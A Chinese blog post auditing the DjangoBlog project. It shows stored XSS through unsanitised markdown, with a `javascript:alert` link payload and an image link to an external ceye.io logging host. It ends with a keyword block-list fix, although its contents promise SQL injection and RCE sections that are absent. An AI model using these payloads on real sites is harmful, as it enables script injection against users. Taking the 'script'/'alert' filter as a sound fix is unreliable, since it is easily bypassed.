<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content=". 项目地址：https:&#x2F;&#x2F;github.com&#x2F;liangliangyy&#x2F;DjangoBlog  安装步骤参考它的README.md就可以了  后台：http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;admin&#x2F;，发表文章添加用户等 1）由于django框架采用的是MTV模型，且是强制路由，所以我们不必像thinkphp那样的隐式路由直接去看控制器，我们直接看总路由 全局搜索ROOT_URLCONF">
<meta property="og:type" content="article">
<meta property="og:title" content="github-5.5k star的django项目的代码审计--&gt;RCE">
<meta property="og:url" content="http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="塔菲">
<meta property="og:description" content=". 项目地址：https:&#x2F;&#x2F;github.com&#x2F;liangliangyy&#x2F;DjangoBlog  安装步骤参考它的README.md就可以了  后台：http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;admin&#x2F;，发表文章添加用户等 1）由于django框架采用的是MTV模型，且是强制路由，所以我们不必像thinkphp那样的隐式路由直接去看控制器，我们直接看总路由 全局搜索ROOT_URLCONF">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/28/image1b65a1990ea79649.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/28/imagee2b68aebe1d50162.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/imagefff19360744b522f.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/imagefd36dd941436f7dc.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/image74eacbe20b1d0fb3.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/imagea64c6f75d922163b.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/imageffa6b1d1954b1b37.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/image043028e7e022161c.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/image21b27282378d3b4e.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/29/image8d175a839ac9ace0.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/a27d96a099aae6a2.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/587076198a4fff2b.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/15f82b31f95dc466.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/516f9d369e40b943.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/c6b27002aaff3b24.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/7a144a24cf0547e9.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/ee72cb3e71627daa.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/e95293871f88dfcd.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/0058d7b3a336dfac.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/b3ffc848f1799903.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/b6fd49da47a8d023.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/421a2ab7b211d8b3.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/907664210ba140ff.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/b75f4cc8ed2923dd.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/45ba11c174ab9a2b.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/731495bdd70d7aac.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/30/e2ce73ed77265e49.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9juV4H.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jKWWj.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jK5yq.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jMhND.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jMo3d.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j1LHx.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j3m8g.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j3V58.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j3MKs.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j3ePS.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j8MWD.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j83yd.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j8tTP.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j8IX9.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jJuxe.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jY70s.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jYH7n.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jYLt0.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jNlqJ.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jNsII.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jNOQU.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jNjL4.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jUrXF.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9ja141.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9ja45n.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j0T2t.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jhX6g.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jhz0s.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j4qER.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j4v8K.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j5nKg.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9j5urQ.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLvG9.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLCNQ.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLZuV.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLeBT.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLlC9.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLYDK.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLtHO.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jLUED.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jL6Df.png">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jL2VS.jpg">
<meta property="og:image" content="https://s1.ax1x.com/2023/05/30/p9jL7rV.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/31/dbe1a2f76c7d640b.png">
<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/31/2b940d201f79fdfd.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/28/image599871baea8ad8ae.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/28/image2810f986b617c793.png">
<meta property="og:image" content="https://cdnjson.com/images/2023/05/28/image596d53960cb4c117.png">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/103672/19/28855/83123/64cca37dFb4ac1907/c7557f835c59464d.jpg">
<meta property="article:published_time" content="2023-05-28T07:35:10.000Z">
<meta property="article:modified_time" content="2023-08-04T07:06:40.543Z">
<meta property="article:author" content="塔菲">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdnjson.com/images/2023/05/28/image1b65a1990ea79649.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>github-5.5k star的django项目的代码审计--&gt;RCE</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/05/31/python%E5%AE%9E%E7%8E%B0%E8%8E%B7%E5%8F%96%E5%85%8D%E8%B4%B9%E7%9A%84chatgpt/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/05/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=github-5.5k star的django项目的代码审计--&gt;RCE&body=Check out this article: http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=github-5.5k star的django项目的代码审计--&gt;RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8XSS-%E5%88%A9%E7%94%A8%E5%92%8C%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.</span> <span class="toc-text">存储XSS-利用和修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%BC%AA%E9%9D%99%E6%80%81%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">判断伪静态是否存在SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E9%83%A8%E7%BD%B2%E5%90%8E%E5%85%B3%E9%97%ADdebug%E6%A8%A1%E5%BC%8F%E3%80%90%E9%9A%8F%E6%84%8F%E3%80%91"><span class="toc-number">3.</span> <span class="toc-text">上线部署后关闭debug模式【随意】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E9%99%86%EF%BC%8C%E6%B3%A8%E5%86%8C%EF%BC%8C%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E5%8A%9F%E8%83%BD%E5%8F%AF%E7%88%86%E7%A0%B4"><span class="toc-number">4.</span> <span class="toc-text">登陆，注册，忘记密码功能可爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0RCE"><span class="toc-number">5.</span> <span class="toc-text">后台RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Markdown-XSS"><span class="toc-number">6.</span> <span class="toc-text">Markdown XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91XSS"><span class="toc-number">6.0.1.</span> <span class="toc-text">触发XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD"><span class="toc-number">7.</span> <span class="toc-text">后续</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        github-5.5k star的django项目的代码审计--&gt;RCE
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">塔菲</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-05-28T07:35:10.000Z" class="dt-published" itemprop="datePublished">2023-05-28</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>.</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/liangliangyy/DjangoBlog">https://github.com/liangliangyy/DjangoBlog</a></p>
<p><img src="https://cdnjson.com/images/2023/05/28/image1b65a1990ea79649.png" alt="image1b65a1990ea79649.png"></p>
<p>安装步骤参考它的<a target="_blank" rel="noopener" href="https://github.com/liangliangyy/DjangoBlog/blob/master/README.md">README.md</a>就可以了</p>
<p><img src="https://cdnjson.com/images/2023/05/28/imagee2b68aebe1d50162.png" alt="imagee2b68aebe1d50162.png"></p>
<p>后台：<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/admin/%EF%BC%8C%E5%8F%91%E8%A1%A8%E6%96%87%E7%AB%A0%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E7%AD%89">http://127.0.0.1:8000/admin/，发表文章添加用户等</a></p>
<p>1）由于django框架采用的是MTV模型，且是强制路由，所以我们不必像thinkphp那样的隐式路由直接去看控制器，我们直接看总路由</p>
<p>全局搜索<code>ROOT_URLCONF</code>，总路由一般是指位于项目根目录（即 <code>settings.py</code> 所在的目录）</p>
<p><img src="https://cdnjson.com/images/2023/05/29/imagefff19360744b522f.png" alt="imagefff19360744b522f.png"></p>
<p><code>djangoblog/urls.py</code>是总路由</p>
<p><img src="https://cdnjson.com/images/2023/05/29/imagefd36dd941436f7dc.png" alt="imagefd36dd941436f7dc.png"></p>
<p>admin后台用的就是django自带的后台，然后用include包含了blog下的urls.py分路由</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">path(</span><br><span class="line">    <span class="string">r&#x27;&#x27;</span>,</span><br><span class="line">    views.IndexView.as_view(),</span><br><span class="line">    name=<span class="string">&#x27;index&#x27;</span>),</span><br></pre></td></tr></table></figure>





<h4 id="存储XSS-利用和修复"><a href="#存储XSS-利用和修复" class="headerlink" title="存储XSS-利用和修复"></a>存储XSS-利用和修复</h4><p>文章的评论区</p>
<p><img src="https://cdnjson.com/images/2023/05/29/image74eacbe20b1d0fb3.png" alt="image74eacbe20b1d0fb3.png"></p>
<p>没有任何限制</p>
<p>我们知道XSS漏洞是需要对输入和输出进行编码/限制的，这里没有对输入进行限制，查看数据库，的确如此</p>
<p><img src="https://cdnjson.com/images/2023/05/29/imagea64c6f75d922163b.png" alt="imagea64c6f75d922163b.png"></p>
<p>但是直接在这个页面上输出时是进行了html编码的</p>
<p><img src="https://cdnjson.com/images/2023/05/29/imageffa6b1d1954b1b37.png" alt="imageffa6b1d1954b1b37.png"></p>
<p>但是在登陆后台之后就执行了</p>
<p><img src="https://cdnjson.com/images/2023/05/29/image043028e7e022161c.png" alt="image043028e7e022161c.png"></p>
<p>另外就是评论区支持markdown语法，系统并未对markdown语法内进行转义，所以我们可以也可以直接前台评论区触发XSS</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[点我触发<span class="variable constant_">XSS</span>](<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/29/image21b27282378d3b4e.png" alt="image21b27282378d3b4e.png"></p>
<p>文章标题，也是同理</p>
<p><img src="https://cdnjson.com/images/2023/05/29/image8d175a839ac9ace0.png" alt="image8d175a839ac9ace0.png"></p>
<p>我们定位到对应<code>postcomment</code>路由，这里采用类视图的方式，起别名是 postcomment</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/a27d96a099aae6a2.png"></p>
<p>在类视图这里，定义了一个模板，我们跟去看这个模板</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/587076198a4fff2b.png"></p>
<p>标准的模板语法，继承了<code>share_layout/base.html</code>模板，通过<code>&#123;% load blog_tags %&#125;</code>来加载<code>blog/templatetags/blog_tags.py</code>内部的方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/15f82b31f95dc466.png"></p>
<p>然后写了一个block块，<code>&lt;title&gt;&#123;&#123; article.title &#125;&#125; | &#123;&#123; SITE_DESCRIPTION &#125;&#125;&lt;/title&gt;</code>，这里title就是前面我们urls.py内部的<code>&#39;article/&lt;int:article_id&gt;/postcomment&#39;,</code>而我们发表评论请求的请求包是：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/516f9d369e40b943.png"></p>
<p><code>article_id</code>就是1，这里无论是通过get方式，还是通过有效的表单，令<code>article</code> = <code>article_id</code>，然后<code>article</code> = 以<code>article_id</code>为主键的第一行值</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/c6b27002aaff3b24.png"></p>
<p>所以模板这里<code>article.title</code>就是取第一行的title键值，<code>SITE_DESCRIPTION</code>是blog_blogsettings下的字段</p>
<p>这里的<code>&#123;&#123; article.body|custom_markdown|striptags|truncatewords:1 &#125;&#125;</code>article是模板参数，后面的是过滤器</p>
<p>custom_markdown方法如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@register.filter()	</span><span class="comment">#	@register.filter()注册一个名为custom_markdown的过滤器函数</span></span><br><span class="line"><span class="meta">@stringfilter	</span><span class="comment">#	使用@stringfilter装饰器指定了该过滤器只能接受字符串作为输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_markdown</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> mark_safe(CommonMarkdown.get_markdown(content))</span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod	</span><span class="comment">#	最后这里调用了_convert_markdown方法，实现将markdown转换为html</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_markdown</span>(<span class="params">value</span>):</span><br><span class="line">    body, toc = CommonMarkdown._convert_markdown(value)</span><br><span class="line">    <span class="keyword">return</span> body</span><br></pre></td></tr></table></figure>

<p>再具体的就不用说了，总之这个地方对markdown转html没有进行过滤</p>
<ul>
<li><code>striptags</code>过滤器函数：它将输入中所有的HTML标签都移除，并返回一个只包含文本的字符串。</li>
<li><code>truncatewords:1</code>过滤器函数：它将输入字符串截短为只包含1个单词。如果原始字符串超过1个单词，则返回第1个单词，后面跟着省略号”…”，否则返回整个原始字符串。</li>
</ul>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/7a144a24cf0547e9.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![The goodest boy](http://fl8nw3.ceye.io/haha123.jpg)</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/ee72cb3e71627daa.png"><img src="https://s3.bmp.ovh/imgs/2023/05/30/e95293871f88dfcd.png"></p>
<p>我们发现这里实际上是执行了两次，以一次是文章内部的markdown被解析，还有一个应该就是上面那个模板处</p>
<p>然后调用了，得到了当前文件的完整路径，如果是再在本地，就是example</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/0058d7b3a336dfac.png"></p>
<p>由于这个写的模板标签都是规范的，其他地方同，所以没有发现模板注入，主要是找输出的地方发现XSS漏洞等</p>
<p>例如，这里的标签内容取的是title的值，</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/b3ffc848f1799903.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/b6fd49da47a8d023.png"></p>
<p>总之，很多地方都存在XSS漏洞，为了省时间，我这里着重找一下custom_markdown xss</p>
<p>在<code>templates/blog/article_detail.html</code>中有两处</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/421a2ab7b211d8b3.png"></p>
<p><code>templates/blog/tags/article_info.html</code>中也有两处</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/907664210ba140ff.png"></p>
<p><code>templates/comments/tags/comment_item.html</code>中有一处，这一处就是我们那个直接打在评论区里的</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/b75f4cc8ed2923dd.png"></p>
<p>在<code>&#123;&#123; sidebar.content|custom_markdown|safe &#125;&#125;</code>中我们也发现一处</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/45ba11c174ab9a2b.png"></p>
<p>这里是利用inclusion_tag进行渲染</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/731495bdd70d7aac.png"></p>
<p>下面就是赋值，我们跟到数据库，对content这里给个值</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/30/e2ce73ed77265e49.png"></p>
<p><img src="https://s1.ax1x.com/2023/05/30/p9juV4H.png"></p>
<p>这里也是支持markdown的，也可以造成XSS</p>
<p>总之修复方案就是在custom_markdown方法里，进行限制，对输入的内容进行判断，如下</p>
<p>使用<code>bleach</code>库来过滤和清理Markdown文本中的非法HTML标签和属性</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@register.filter()</span></span><br><span class="line"><span class="meta">@stringfilter</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_markdown</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> mark_safe(CommonMarkdown.get_markdown(content))</span><br></pre></td></tr></table></figure>

<p>此时输出的content：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Click Me](javascript:alert(&amp;#x27;xss&amp;#x27;))</span><br></pre></td></tr></table></figure>

<p>我们增加判断，如果content内含有script，则拦截</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@register.filter()</span></span><br><span class="line"><span class="meta">@stringfilter</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_markdown</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    forbidden_keywords = [<span class="string">&quot;script&quot;</span>, <span class="string">&quot;alert&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords:</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> content.lower():</span><br><span class="line">            <span class="comment"># 如果发现输入文本包含特定关键字，则返回 400 错误</span></span><br><span class="line">            <span class="keyword">return</span> mark_safe(<span class="string">&quot;&lt;h1&gt;存在疑似攻击行为，已拦截&lt;/h1&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mark_safe(CommonMarkdown.get_markdown(content))</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jKWWj"><img src="https://s1.ax1x.com/2023/05/30/p9jKWWj.png" alt="p9jKWWj.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jK5yq"><img src="https://s1.ax1x.com/2023/05/30/p9jK5yq.png" alt="p9jK5yq.png"></a></p>
<p>这里的forbidden_keywords列表你可以自己定义内容</p>
